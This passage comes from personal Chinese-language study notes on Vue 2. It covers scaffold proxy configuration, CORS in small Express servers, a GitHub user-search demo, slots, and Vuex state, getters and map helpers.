            </button>
          </li>
        </ul>
      </transition>
    </template>
    ```

    在这里我们直接将整个组件外面包裹`<transition>`标签，以及附上相应的属性，最后在`<script>`标签中引入样式库就可以了

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331171245606.png" alt="image-20230331171245606" style="zoom:50%;" />

## 3.14 Vue脚手架配置代理

### 3.14.1 尝试为nodejs服务器发送Ajax请求

​	我们现在尝试在Vue脚手架中用axois给本地的node服务器发送ajax请求来获取数据

​	Ajax服务器 server1.js

```javascript
const express = require('express')
const app = express()

app.use((request,response,next)=>{
	console.log('有人请求服务器1了');
	// console.log('请求来自于',request.get('Host'));
	// console.log('请求的地址',request.url);
	next()
})

app.get('/students',(request,response)=>{
	
	const students = [
		{id:'001',name:'tom',age:18},
		{id:'002',name:'jerry',age:19},
		{id:'003',name:'tony',age:120},
	]
	response.send(students)
})

app.listen(3000,(err)=>{
	if(!err) console.log('服务器1启动成功了,请求学生信息地址为：http://localhost:3000/students');
})

```

App.vue

```vue
<template>
  <div id="root">
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  name: "App",
  methods: {
    getStudents(){
      // axios.get('http://localhost:3000/students').then(
      // (response) => {
      //   console.log(' 请求成功了', response.data);
      // },
      // (error) => {
      //   console.log('请求失败了', error.message);
      // })
      axios({
        method: 'GET',
        url: 'http://localhost:8080/students',

      }).then((response) => {
        console.log('请求成功了', response.data);
      })
    }
  },
};
</script>
```

​	这边引入了axios这个库，并且在目标服务器配置了一些请求头设置了可跨域

​	如果不设置跨域，就会发现有错误，原因是我们的客户端和服务器的端口不一样，浏览器接收到服务器返回的数据，发现我们和服务器不是同源，就不把数据给我们

![image-20230331195340436](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331195340436.png)

​	当我们在服务器里配置了跨域的请求头，下面的线就走通了

```javascript
		// 设置响应头 设置允许跨域
    response.setHeader('Access-Control-Allow-Origin', '*')
    // 设置允许任何类型的响应头
    response.setHeader('Access-Control-Allow-Headers', "*")
```

![image-20230331195531962](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331195531962.png)

​	这是我们借助axios来发送Ajax请求，其实我们还可以配置代理服务器来为我们发送Ajax请求，由于服务器之间不受同源策略的限制，所以我们需要代理服务器跟我们同源，跟目标服务器不同源即可。

![image-20230331200006157](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331200006157.png)

​	配置代理服务器的方法，图里面有两种：1. nginx服务器 2. vue-cli脚手架代理

使用nginx服务器的学习成本较高，而且需要后端诸多知识，我们这边选择vue-cli中的脚手架代理

### 3.14.2 Vue脚手架配置代理 方法一

在`vue.config.js`中添加如下配置：

```js
  // 开启代理服务器
  devServer: {
    // 告诉代理服务器请求转发的服务器
    proxy: 'http://localhost:3000'
  }
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器（优先匹配前端资源 public文件夹中的）

### 3.14.3 Vue脚手架配置代理 方法二

​	编写vue.config配置具体代理规则：

```javascript
module.exports = {
	  devServer: {
    proxy: {
      // 请求前缀 代理服务器会检查请求有没有这个前缀，控制是否需要全部走代理
      '/api': { // 匹配所有以 '/api'开头的请求路径
        target: 'http://localhost:3000',// 代理目标的基础路径

        // 匹配所有以/api开头的路径，都变成空字符串
        // 避免代理服务器转发给服务器的路径中带有/api从而匹配错误404
        pathRewrite: {'^/api': ''},
        ws: true, // 用于支持websocket
        // changeOrigin: true // 用于控制请求头中的host值
      },
      '/czq': { // 匹配所有以 '/czq'开头的请求路径
        target: 'http://localhost:3001',// 代理目标的基础路径
        
        // 匹配所有以/api开头的路径，都变成空字符串
        // 避免代理服务器转发给服务器的路径中带有/czq从而匹配错误404
        pathRewrite: {'^/czq': ''},
        ws: true, // 用于支持websocket
        // changeOrigin: true // 用于控制请求头中的host值
      },
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

在App中给server2发送ajax请求以获取车辆信息

```vue
<template>
  <div id="root">
    <button @click="getStudents">获取学生信息</button>
    <button @click="getCars">获取汽车信息</button>
  </div>
</template>
```

```javascript
		getCars(){
      axios({
        method: 'GET', 
        url: 'http://localhost:8080/czq/cars'
      }).then((response) => {
        console.log('请求成功了', response.data);
      })
    }
```

server2.js

```javascript
const express = require('express')
const app = express()

app.use((request,response,next)=>{
	console.log('有人请求服务器2了');
	next()
})

app.get('/cars',(request,response)=>{
	// 设置响应头 设置允许跨域
    response.setHeader('Access-Control-Allow-Origin', '*')
    // 设置允许任何类型的响应头
    response.setHeader('Access-Control-Allow-Headers', "*")
	const cars = [
		{id:'001',name:'奔驰',price:199},
		{id:'002',name:'马自达',price:109},
		{id:'003',name:'捷达',price:120},
	]
	response.send(cars)
})

app.listen(3001,(err)=>{
	if(!err) console.log('服务器2启动成功了,请求汽车信息地址为：http://localhost:3001/cars');
})
const express = require('express')
const app = express()

app.use((request,response,next)=>{
	console.log('有人请求服务器2了');
	next()
})

app.get('/cars',(request,response)=>{
	// 设置响应头 设置允许跨域
    response.setHeader('Access-Control-Allow-Origin', '*')
    // 设置允许任何类型的响应头
    response.setHeader('Access-Control-Allow-Headers', "*")
	const cars = [
		{id:'001',name:'奔驰',price:199},
		{id:'002',name:'马自达',price:109},
		{id:'003',name:'捷达',price:120},
	]
	response.send(cars)
})

app.listen(3001,(err)=>{
	if(!err) console.log('服务器2启动成功了,请求汽车信息地址为：http://localhost:3001/cars');
})

```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331204836159.png" alt="image-20230331204836159" style="zoom:50%;" />

server1中的输出

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331204902142.png" alt="image-20230331204902142" style="zoom:50%;" />

server2中的输出

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230331204927354.png" alt="image-20230331204927354" style="zoom:50%;" />

## 3.15 GitHub搜索案例

### 3.15.1 效果

![image-20230403144710081](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403144710081.png)

### 3.15.2 静态页面的搭建

​	我们将在这个案例中将使用第三方样式库bootstrap来布局页面

​	在public中新建一个css文件夹来存放bootstrap.css

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403161601052.png" alt="image-20230403161601052" style="zoom:50%;" />

Index.html中引入：

```html
    <!-- 引入 第三方样式 -->
    <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
```

App.vue

```vue
<template>
  <div class="container">
    <Search />
    <List />
  </div>
</template>

<script>
import Search from "./components/Search.vue";
import List from "./components/List.vue";
export default {
  name: "App",
  components: {
    Search,
    List,
  },
};
</script>

```

Search.vue

```vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        placeholder="enter the name you search"
      />&nbsp;<button>Search</button>
    </div>
  </section>
</template>

<script>
export default {
  name: "Search",
};
</script>

<style>
</style>
```

List.vue

```vue
<template>
  <div class="row">
    <div class="card">
      <a href="https://github.com/xxxxxx" target="_blank">
        <img src="https://cn.vuejs.org/images/logo.svg" style="width: 100px" />
      </a>
      <p class="card-text">xxxxxx</p>
    </div>
    <div class="card">
      <a href="https://github.com/xxxxxx" target="_blank">
        <img src="https://cn.vuejs.org/images/logo.svg" style="width: 100px" />
      </a>
      <p class="card-text">xxxxxx</p>
    </div>
    <div class="card">
      <a href="https://github.com/xxxxxx" target="_blank">
        <img src="https://cn.vuejs.org/images/logo.svg" style="width: 100px" />
      </a>
      <p class="card-text">xxxxxx</p>
    </div>
    <div class="card">
      <a href="https://github.com/xxxxxx" target="_blank">
        <img src="https://cn.vuejs.org/images/logo.svg" style="width: 100px" />
      </a>
      <p class="card-text">xxxxxx</p>
    </div>
    <div class="card">
      <a href="https://github.com/xxxxxx" target="_blank">
        <img src="https://cn.vuejs.org/images/logo.svg" style="width: 100px" />
      </a>
      <p class="card-text">xxxxxx</p>
    </div>
  </div>
</template>

<script>
export default {
  name: "List",
};
</script>

<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: 0.75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: 0.75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}
</style>
```

### 3.15.3 GitHub搜索案例_列表展示

​	我们要在Search组件中发送Ajax请求来获取数据，然后将数据传给List组件中展示，所以我们要用到axios和全局事件总线

​	Search.vue

```vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        placeholder="enter the name you search"
        v-model="keyWord"
      />&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>
```



```vue
<script>
import axios from 'axios'
export default {
  name: "Search",
  data() {
    return {
      keyWord: ''
    }
  },
  methods: {
    searchUsers(){
      axios({
        method: 'GET',
        url: `https://api.github.com/search/users?q=${this.keyWord}`
      }).then(
        (response) => {
          this.$bus.$emit('getUsers', response.data.items)
        },
        (error) => {
          console.log(error);
        }
      )
    }
  },
};
</script>
```

​	这边使用了插值语法来获取我们的输入，使用了axios发送Ajax请求，并且使用了全局事件总线来保证兄弟组件间的通信

List.vue

```vue
<template>
  <div class="row">
    <div class="card" v-for="user in users" :key="user.id">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{user.login}}</p>
    </div>
  </div>
</template>
```

```javascript
  data() {
    return {
        users:[]
    }
  },
  mounted() {
    this.$bus.$on('getUsers', (users) => {
        console.log('我是List组件，收到了数据：', users);
        this.users = users
    })
  },
```

这里在模板中展示的属性全部都来自于response

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403175335719.png" alt="image-20230403175335719" style="zoom:50%;" />

### 3.15.4 GitHub搜索案例_完善案例

​	上一节我们的搜索案例大抵是完成了，但是还有一些需要完善的：在List这个组件中，我们只写了搜索成功之后的回应，我们应该还写出欢迎界面、加载界面和错误信息显示，将它们包在了一个数组中

​	我们需要定义这些变量来赋给模板从而决定页面的展示与否

List.vue

```javascript
  name: "List",
  data() {
    return {
      info: {
        isFirst: true,
        isLoading: false,
        errMsg: "",
        users: [],
      },
    };
```

```vue
<template>
  <div class="row">
    <!-- 展示用户列表 -->
    <div
      v-show="info.users.length"
      class="card"
      v-for="user in info.users"
      :key="user.id"
    >
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <!-- 展示欢迎词 -->
    <h1 v-show="info.isFirst">欢迎使用！！！</h1>
    <!-- 展示加载中 -->
    <h1 v-show="info.isLoading">加载中......</h1>
    <!-- 展示错误信息 -->
    <h1 v-show="info.errMsg">{{ info.errMsg }}</h1>
  </div>
</template>
```

事件的触发所传的相关参数：

```javascript
  mounted() {
    this.$bus.$on("updateListData", (dataObj) => {
      console.log(dataObj);
      // 它会把info中的属性所有都摊在这，最后再把dataObj中所有属性也摊在这，重名的属性以后面的为主
      // 这样就不会丢失isFirst
      this.info = {...this.info, ...dataObj}
    });
  },
```

Search中所决定的数据类型：

```javascript
    searchUsers(){
      // 请求前更新List的数据
      this.$bus.$emit('updateListData', {isFirst: false, isLoading: true, errMsg: '', users: []})
      axios({
        method: 'GET',
        url: `https://api.github.com/search/users?q=${this.keyWord}`
      }).then(
        (response) => {
          console.log('请求成功了');
          // 请求成功后更新List的数据
          this.$bus.$emit('updateListData', {isLoading: false, errMsg: '', users: response.data.items})
        },
        (error) => {
          // 请求失败后更新List的数据
          this.$bus.$emit('updateListDataupdateListData', {isLoading: false, errMsg: error.message, users: []})
      
        }
      )
    }
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403185624780.png" alt="image-20230403185624780" style="zoom:50%;" />

![image-20230403185652188](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403185652188.png)

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403185733036.png" alt="image-20230403185733036" style="zoom:50%;" />

### 3.15.5 搜索案例的Vue-resource写法

​	vue-resource这个库和axios类似，里面的API很多都是一样的，风格也是promise风格。这个库在Vue1.0的时候用的比较多，现在作为了解即可

```shell
npm i vue-resource
```

​	这个库是一个插件，所以我们需要全局配置

```javascript
// 引入vue-resource插件
import vueResource from 'vue-resource';
// 使用插件
Vue.use(vueResource)
```

​	使用之后，在我们vm和vc身上全局都会有`$http`这个属性

所以我们可以开始发送请求

Search.vue

```javascript
      this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`)
        .then(
          (response) => {
            console.log("请求成功了");
            // 请求成功后更新List的数据
            this.$bus.$emit("updateListData", {
              isLoading: false,
              errMsg: "",
              users: response.data.items,
            });
          },
          (error) => {
            // 请求失败后更新List的数据
            this.$bus.$emit("updateListData", {
              isLoading: false,
              errMsg: error.message,
              users: [],
            });
          }
        );
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403192359023.png" alt="image-20230403192359023" style="zoom:50%;" />

## 3.16 插槽

	1. 作用：让父组件可以向子组件指定位置插入HTML结构，也是一种组件间通信的方式，适用于**父组件 ===> 子组件**。插槽就是一个占位符，存放父组件内部独有的HTML结构
	1. 分类：默认插槽、具名插槽、作用域插槽

### 3.16.1 默认插槽

```vue
<!-- 父组件中： -->
 <Category>
     <div>html结构1</div>
 </Category>
 
 
<!-- 子组件Category.vue中： -->
   <template>
      <div>
         <!-- 定义插槽 -->
         <slot>插槽默认内容...</slot>
      </div>
   </template>

```

App.vue

```vue
<template>
  <div class="container">
    <Category title="美食" :listData="foods">
      <img src="https://n.sinaimg.cn/sinakd20200530ac/320/w640h480/20200530/3d3e-iufmpmp2778569.jpg" alt="">
    </Category>

    <Category title="动物">
      <ul>
        <li v-for="(item, index) in animals" :key="index">{{item}}</li>
      </ul>
    </Category>

    <Category title="游戏">
      <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
    </Category>
  </div>
</template>
```

Categoray.vue

```vue
<template>
  <div class="category">
    <h3>{{title}}分类</h3>
    <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
    <slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['title']
}
</script>
```

​	<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230403203659913.png" alt="image-20230403203659913" style="zoom:50%;" />

### 3.16.2 具名插槽

​	当我们想在页面中使用多个插槽的时候，往往我们会给插槽取名字来区分

​	Category.vue

```vue
<template>
  <div class="category">
    <h3>{{title}}分类</h3>
    <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
    <slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
    <slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  </div>
</template>
```

App.vue

```vue
<template>
  <div class="container">
    <Category title="美食" :listData="foods">
      <img
        slot="center"
        src="https://n.sinaimg.cn/sinakd20200530ac/320/w640h480/20200530/3d3e-iufmpmp2778569.jpg"
        alt=""
      />
      <a slot="footer" href="http://www.baidu.com">更多美食</a>
    </Category>

    <Category title="动物">
      <ul slot="center">
        <li v-for="(item, index) in animals" :key="index">{{ item }}</li>
      </ul>
      <div class="foot" slot="footer">
        <a href="http://www.baidu.com">单机游戏</a>
        <a href="http://www.baidu.com">网络游戏</a>
      </div>
    </Category>

    <Category title="游戏">
      <video
        slot="center"
        controls
        src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"
      ></video>
      <template v-slot:footer>
        <div class="foot">
          <a href="http://www.baidu.com">经典</a>
          <a href="http://www.baidu.com">热门</a>
          <a href="http://www.baidu.com">推荐</a>
        </div>
        <h4>欢迎试玩</h4>
      </template>
    </Category>
  </div>
</template>
```

​	值得注意的是 如果被操作的标签是template，我们在标签上的插槽标记应该写成`v-slot:xxx`形式

![image-20230404165752384](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404165752384.png)

### 3.16.3 作用域插槽

​	这个时候**数据在组件的自身，但根据数据生成的解构需要组件的使用者来决定**（animals这个数据在Category组件中，但使用数据所遍历出来的解构由App组件决定）

像props一样传值

父组件App.vue

```vue
<template>
  <div class="container">
    <Category title="动物">
      <template scope="test">
        <!-- {{test.animals}} -->
        <ul>
          <li v-for="(item, index) in test.animals" :key="index">{{ item }}</li>
        </ul>
        <!-- 可以传多个参数 -->
        <h4>{{test.meg}}</h4>
      </template>
    </Category>

    <Category title="动物">
      <!-- es6解构赋值 -->
      <template scope="{animals}">
        <ol>
          <li style="color: red" v-for="(item, index) in animals" :key="index">{{ item }}</li>
        </ol>
      </template>
    </Category>

    <Category title="动物">
    	<!-- 这里的 slot-scope 等价于 scope,写法不同 -->
      <template slot-scope="test">
        <h4 v-for="(item, index) in test.animals" :key="index">{{ item }}</h4>
      </template>
    </Category>
  </div>
</template>
<script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  components: {
    Category,
  },
};
</script>
```

子组件Category.vue

```vue
<template>
  <div class="category">
    <h3>{{ title }}分类</h3>
    <slot :animals="animals" msg="hello">我是默认的一些内容</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props: ["title"],
  data() {
    return {
      animals: ["泥杆马", "梅狸猫", "蒸德湿泥鸭", "灰勒塔德钱兔", "醉嚎狮"],
    };
  },
};
</script>
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404180042581.png" alt="image-20230404180042581" style="zoom:50%;" />

# 4.Vuex

## 4.1 理解Vuex

### 4.1.1 Vuex是什么

	1. 概念：专门在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于**任意组件间通信**
	1. GitHub地址：https://github.com/vuejs/vuex

多组件共享数据时使用**全局事件总线**管理：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404191931567.png" alt="image-20230404191931567" style="zoom:50%;" />

多组件共享数据时使用**Vuex**管理：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404192039779.png" alt="image-20230404192039779" style="zoom:50%;" />

### 4.1.3 什么时候使用Vuex

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态

## 4.2 求和案例_纯vue版

​	这里我们写出两个版本的求和案例：纯vue版和Vuex版，用来对比

App.vue

```vue
<template>
  <Count/>
</template>

<script>
import Count from './components/Count.vue'
export default {
    name: 'App',
    components: {
        Count
    }
}
</script>

<style>

</style>
```

Count.vue

```vue
<template>
  <div>
    <h1>当前求和为：{{ this.sum }}</h1>
    <select v-model="selectedNumber">
    <!-- 或者不用v-bind，直接在v-model使用类型转换 -->
    <!-- <select v-model.number="selectedNumber"> -->
      <option :value="1">1</option>
      <option :value="2">2</option>
      <option :value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementAsync">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: "Count",
  data() {
    return {
      sum: 0, // 当前的求和
      selectedNumber: 1, // 用户选择的数字
    };
  },
  methods: {
    increment() {
      this.sum += this.selectedNumber;
    },
    decrement() {
      this.sum -= this.selectedNumber;
    },
    incrementOdd() {
      if (this.sum % 2) {
        this.sum += this.selectedNumber;
      }
    },
    incrementAsync(){
        setTimeout(() => {
            this.sum += this.selectedNumber
        }, 500);
    }
  },
};
</script>

<style>
button {
  margin-left: 5px;
}
</style>
```

这里我们将sum求和存在了Count这个组件中，Vuex将会把它提取出来

调试结果：

![image-20230404201951594](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404201951594.png)

## 4.3 Vuex原理图

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230404210756215.png" alt="image-20230404210756215" style="zoom:50%;" />

​	1. 当我们用户在vc中写出我们的逻辑时，可以调用`dispatch()`，传入我们方法的名字，在Action这个对象中肯定会有一个key与我们的方法相符，然后Action就会调用`commit()`将（Dispatch）我们的动作放给Mutations（Commit），Mutations本质也是一个对象，它手中会握住我们的目标数据和我们传过来需要改变的参数，他帮我们修改数据之后（Mutate），存在State中的我们的数据将会修该，并会帮我们重新渲染页面（Render）

## 4.4 搭建Vuex开发环境

1. 下载安装：`npm i vuex@3`

这里要注意的是：在2022年3月之后，由于我们创建脚手架默认安装的是Vue3，所以我们安装Vuex的时候默认版本是Vuex4，这个版本只能给Vue3使用，所以我们在安装的时候必须使用Vue2对应的Vuex3

安装了Vuex，并使用之后，我们就可以在我们的vm或者vc的配置项中写`store`这个配置项了，并且所有vm和vc都可以看到`store`

main.js

```javascript
// 引入Vue
import Vue from 'vue';
// 引入Vuex
import Vuex from 'Vuex'
// 引入App
import App from './App'
// 引入vue-resource插件
import vueResource from 'vue-resource';
// 引入store
import store from './store';

// 关闭Vue的生产提示
Vue.config.productionTip = false
// 使用插件
Vue.use(vueResource)
// 使用Vuex插件
Vue.use(Vuex)

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
    store,
    // 安装全局事件总线
    beforeCreate() {
        Vue.prototype.$bus = this
    },
    mounted(){
        //console.log(this);
    }
})
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230405201607266.png" alt="image-20230405201607266" style="zoom:50%;" />

2. 有两种创建文件的方法：`src/vuex/store.js`和`src/store/index.js`，这边Vue更推荐后者

```js
// Actions——用于响应组件里面的动作
const actions = {

}
// 准备Mutations——用于操作数据(state)
const mutations = {

}
// 准备State——用于存储数据
const state = {

}

// 创建并暴露Store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

​	这样我们会发现有错误：原因是我们创建Store实例后再引入的Vuex，这里面的顺序是有问题的，而且在我们模块化语法中，只有当我们引入的文件中的代码在跑完之后的变量才会放入我们自己的代码中生效，而且vue在执行语句的时候会首先把所有的import语句中的代码先执行完毕然后再看我们自己的代码，所以我们手动更改顺序也不行

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230405202436841.png" alt="image-20230405202436841" style="zoom:50%;" />

​	为了解决这个问题，我们不妨直接在引入的文件（store）中先一步创建Vuex的实例，这样就不会出现代码先后的差错了

3. 在main.js中创建vm是传入store配置项

main.js

```javascript
// 引入Vue
import Vue from 'vue';
// 引入App
import App from './App'
// 引入vue-resource插件
import vueResource from 'vue-resource';
// 引入store
import store from './store';

// 关闭Vue的生产提示
Vue.config.productionTip = false
// 使用插件
Vue.use(vueResource)

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
    store,
    // 安装全局事件总线
    beforeCreate() {
        Vue.prototype.$bus = this
    },
    mounted(){
        // console.log(this);
    }
})
```

`/src/store/index.js`

```js
// 该文件用于创建Vuex中最为核心的store

// // 引入Vue
import Vue from 'vue'
// // 引入Vuex
import Vuex from 'vuex'

// 使用vuex插件
Vue.use(Vuex)

// Actions——用于响应组件里面的动作
const actions = {

}
// 准备Mutations——用于操作数据(state)
const mutations = {

}
// 准备State——用于存储数据
const state = {

}

// 创建并暴露Store
export default new Vuex.Store({
    actions,
    mutations,
    state
})

```

​	这样我们的store才能正确被vm和所有vc看到并且拥有强大的功能

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230405202901097.png" alt="image-20230405202901097" style="zoom:50%;" />

## 4.5 使用Vuex编写求和案例

1. 初始化数据、配置`actions`、配置`mutations`，操作文件`store.js`

```javascript
// 该文件用于创建Vuex中最为核心的store

// // 引入Vue
import Vue from 'vue'
// // 引入Vuex
import Vuex from 'vuex'

// 使用vuex插件
Vue.use(Vuex)

// Actions——用于响应组件里面的动作
const actions = {
    // 没有网络请求或其他业务逻辑的动作可以不需要经过actions，直接和mutations对话
    // increment(context, value) {
    //     console.log('actions中的increment被调用了', context, value);
    //     context.commit('INCREMENT', value)
    // },
    // decrement(context, value) {
    //     console.log('actions中的decrement被调用了', context, value);
    //     context.commit('DECREMENT', value)
    // },

    // 网络请求或其他业务逻辑一般在actions里面完成
    incrementOdd(context, value) {
        if (context.state.sum % 2) {
            console.log('actions中的incrementOdd被调用了', context, value);
            context.commit('INCREMENT', value)
        }
    },
    // 网络请求或其他业务逻辑一般在actions里面完成
    incrementAsync(context, value){
        setTimeout(() => {
            console.log('actions中的incrementAsync被调用了', context, value);
            context.commit('INCREMENT', value)
        }, 500)
    }
}
// 准备Mutations——用于操作数据(state)
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了', state, value);
        state.sum += value
    },
    DECREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了', state, value);
        state.sum -= value
    },
}
// 准备State——用于存储数据
const state = {
    sum: 0, // 当前的求和
}

// 创建并暴露Store
export default new Vuex.Store({
    actions,
    mutations,
    state
})

```

2. 组件中读取Vuex中的数据：`$this.store.state.存入的数据名`
3. 组件中修改Vuex中的数据：`this.$store.dispatch('actions中的方法名', 数据)`或`this.$store.commit('mutations中的方法名', 数据)`

​	**备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，直接与mutations对话。即不写`dispatch`，直接编写`commit`**

`src/components/Count.vue`

```vue
<template>
  <div>
    <h1>当前求和为：{{this.$store.state.sum}}</h1>
    <select v-model="selectedNumber">
    <!-- 或者不用v-bind，直接在v-model使用类型转换 -->
    <!-- <select v-model.number="selectedNumber"> -->
      <option :value="1">1</option>
      <option :value="2">2</option>
      <option :value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementAsync">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: "Count",
  data() {
    return {
      selectedNumber: 1, // 用户选择的数字
    };
  },
  methods: {
    // 没有网络请求或其他业务逻辑的动作可以不需要经过actions，直接和mutations对话
    increment() {
      this.$store.commit('INCREMENT', this.selectedNumber)
    },
    // 没有网络请求或其他业务逻辑的动作可以不需要经过actions，直接和mutations对话
    decrement() {
      this.$store.commit('DECREMENT', this.selectedNumber)
    },
    incrementOdd() {
      this.$store.dispatch('incrementOdd', this.selectedNumber)
    },
    incrementAsync(){
      this.$store.dispatch('incrementAsync', this.selectedNumber)
    }
  },
};
</script>

<style>
button {
  margin-left: 5px;
}
</style>
```

![image-20230405212601308](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230405212601308.png)

## 4.5 Vue开发者工具的使用

​	和redux一样，Vuex也有属于自己的开发者工具 它集成在了vue开发者工具的TimeLine选项卡中

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230410194014387.png" alt="image-20230410194014387" style="zoom:50%;" />

## 4.6 Vuex中的Store中的getters配置项

1. 概念：当`state`中的数据需要经过加工后再使用并且需要多组件复用时，可以使用getters加工
2. 在`store.js`中追加`getters`配置

```javascript
// 准备getters——用于将state中的数据进行加工
const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

// 创建并暴露Store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

3. 读取组件中的数据：`$store.getters.bigSum`

Count组件中：

```vue
<h3>当前求和被放大10倍后为：{{$store.getters.bigSum}}</h3>
```

调试结果：

![image-20230410195847953](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230410195847953.png)

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230410195916362.png" alt="image-20230410195916362" style="zoom:50%;" />

​	我们将store中的`state`与`getters`同vc中的`data`与`computed`对比，发现这两对属性都非常相似，`state`与`data`都充当数据源， `getters`和`computed`都是对数据进行加工，而且他们的值都是由返回值决定，`getters`可以多个组件同时使用，`computed`只能给当前组件自己使用

## 4.7 四个map方法的使用

在Count.vue中新加入：

```vue
    <h1>当前求和为：{{sum}}</h1>
    <h3>当前求和被放大10倍后为：{{bigSum}}</h3>
    <h3>我在{{school}}，学习{{subject}}</h3>
```



1. **mapState**方法：帮助我们映射`state`中的数据为`计算属性`

```javascript
  computed: {
    // 靠程序员自己亲自去写计算属性：
    // sum(){
    //   return this.$store.state.sum
    // },
    // school(){
    //   return this.$store.state.school
    // },
    // subject(){
    //   return this.$store.state.subject
    // },

    // es6语法：把每一组keyvalue都展开放入这里
    // 借助mapState生成计算属性，从state中读取属性（对象写法）
    ...mapState({sum: 'sum', school: 'school', subject: 'subject'}),
    // 借助mapState生成计算属性，从state中读取属性（数组写法）
    ...mapState(['sum', 'school', 'subject']),
```

2. **mapGetters**方法：用于帮助我们映射`getters`中的数据为计算属性

```javascript
  computed: {

    // ------------------------------------
    // bigSum(){
    //   return this.$store.getters.bigSum
    // }
    
    // 借助mapState生成计算属性，从getters中读取属性（对象写法）
   	...mapGetters({bigSum: 'bigSum'}),
    // 借助mapState生成计算属性，从getters中读取属性（数组写法）
    ...mapGetters(['bigSum'])
  },
```

3. **mapActions**方法：用于帮助我们生成与`actions`对话的方法，即：包含`$store.dispatch(xxx)`的函数

```vue
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementAsync">等一等再加</button>
```

```js
  methods: {
    // ----------------------------------------------------------
    // 程序员亲自写方法
    // incrementOdd() {
    //   this.$store.dispatch('incrementOdd', this.selectedNumber)
    // },
    // incrementAsync(){
    //   this.$store.dispatch('incrementAsync', this.selectedNumber)
    // }

